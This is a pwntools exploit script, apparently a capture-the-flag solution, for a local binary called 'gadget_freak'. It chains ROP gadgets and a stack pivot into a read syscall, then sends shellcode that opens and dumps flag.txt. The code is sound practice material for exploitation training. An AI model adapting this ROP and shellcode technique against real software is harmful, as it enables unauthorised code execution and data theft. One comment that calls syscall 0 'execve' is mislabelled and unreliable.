from pwn import *

context.binary = elf = ELF("./gadget_freak")
pr = process("./gadget_freak")
# gdb.attach(pr)
POP_RDI = 0x300000+0x30d7c
POP_RSI = 0x300000+0x30d78
POP_RDX = 0x300000+0x30d68
SYSCALL = 0x300000+0x143c
POP_RAX = 0x300000+0x30d60

XCHG_EAX_ESP = 0x300000+0x30e50

pr.sendline(b'2')

#read(0,SYSCALL+2,0x100)
payload = p64(POP_RAX)
payload += p64(0) # syscall number for execve
payload += p64(POP_RDI)
payload += p64(0)
payload += p64(POP_RSI)
payload += p64(SYSCALL+2)
payload += p64(POP_RDX)
payload += p64(0x100)
payload += p64(SYSCALL)

payload += b'flag.txt'
payload+= b'\x00' * (128 - len(payload))

payload += p32(7) # prot
payload += p32(0)
payload += p64(XCHG_EAX_ESP) # addr

pr.sendline(payload)
pr.sendline(b'7')

shellcode = asm(f'''
    mov rax,0x2
    mov rdi,{0x200000+8*9}
    mov rsi,0
    syscall
    mov rax,0x28
    mov rdi,1
    mov rsi,3
    mov rdx,0
    mov r10,0x100
    syscall
''')
print(shellcode)
pr.sendline(shellcode)
pr.interactive()